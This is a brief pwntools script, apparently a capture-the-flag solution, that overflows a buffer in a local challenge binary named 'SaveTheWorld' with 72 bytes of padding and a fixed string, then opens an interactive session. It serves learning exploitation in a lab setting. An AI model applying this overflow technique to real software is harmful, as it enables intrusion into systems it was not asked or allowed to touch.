from pwn import *

p = process('./SaveTheWorld')

msgin = b'a'*72 + b'Jotaro!!Star Platinum!!!HORA9999'
p.sendline(msgin)
p.interactive()
